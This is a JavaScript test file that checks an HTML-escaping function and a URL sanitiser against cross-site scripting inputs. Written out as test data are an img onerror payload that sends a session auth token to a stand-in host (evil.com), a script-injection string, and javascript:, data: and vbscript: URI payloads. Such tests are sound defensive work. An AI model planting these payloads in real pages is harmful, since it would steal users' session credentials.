import test from "node:test";
import assert from "node:assert/strict";
import { escapeHtml, sanitizeUrl } from "../frontend/sanitize.js";

test("escapeHtml sanitizes hostile tags, script injection, and attributes", () => {
  const hostilePayload = '<img src=x onerror="fetch(\'http://evil.com?key=\'+sessionStorage.getItem(\'auth\'))">';
  const escaped = escapeHtml(hostilePayload);

  assert.strictEqual(escaped.includes("<img"), false);
  assert.strictEqual(escaped.includes(">"), false);
  assert.strictEqual(escaped.includes('"'), false);
  assert.strictEqual(escaped.includes("'"), false);
  assert.strictEqual(escaped.startsWith("&lt;img"), true);
  assert.strictEqual(
    escaped,
    "&lt;img src=x onerror=&quot;fetch(&#39;http://evil.com?key=&#39;+sessionStorage.getItem(&#39;auth&#39;))&quot;&gt;"
  );
});

test("escapeHtml prevents script execution in mock HTML rendering context", () => {
  const hostileDisplayName = "<script>window.__pwned = true;</script>";
  const escaped = escapeHtml(hostileDisplayName);

  // Assert tags are neutral text entities
  assert.strictEqual(escaped, "&lt;script&gt;window.__pwned = true;&lt;/script&gt;");

  // In HTML context, setting innerHTML to escaped text creates text nodes, not HTML elements
  const mockRendered = `<div class="player-name">${escaped}</div>`;
  assert.strictEqual(mockRendered.includes("<script>"), false);
});

test("escapeHtml safely handles null, undefined, and non-string inputs", () => {
  assert.strictEqual(escapeHtml(null), "");
  assert.strictEqual(escapeHtml(undefined), "");
  assert.strictEqual(escapeHtml(100), "100");
  assert.strictEqual(escapeHtml(0), "0");
  assert.strictEqual(escapeHtml(false), "false");
});

test("sanitizeUrl blocks javascript: and data: URIs", () => {
  assert.strictEqual(sanitizeUrl("javascript:alert(1)"), "#");
  assert.strictEqual(sanitizeUrl("  JAVASCRIPT:alert(document.domain)"), "#");
  assert.strictEqual(sanitizeUrl("data:text/html,<script>alert(1)</script>"), "#");
  assert.strictEqual(sanitizeUrl("  DATA:image/svg+xml;utf8,<svg onload=alert(1)/>"), "#");
  assert.strictEqual(sanitizeUrl("vbscript:msgbox(1)"), "#");
});

test("sanitizeUrl permits valid https, anchor, and relative links", () => {
  const explorerUrl = "https://stellar.expert/explorer/testnet/tx/12345abcdef";
  assert.strictEqual(sanitizeUrl(explorerUrl), explorerUrl);
  assert.strictEqual(sanitizeUrl("/markets.html"), "/markets.html");
  assert.strictEqual(sanitizeUrl("#trade"), "#trade");
  assert.strictEqual(sanitizeUrl(""), "#");
  assert.strictEqual(sanitizeUrl(null), "#");
});
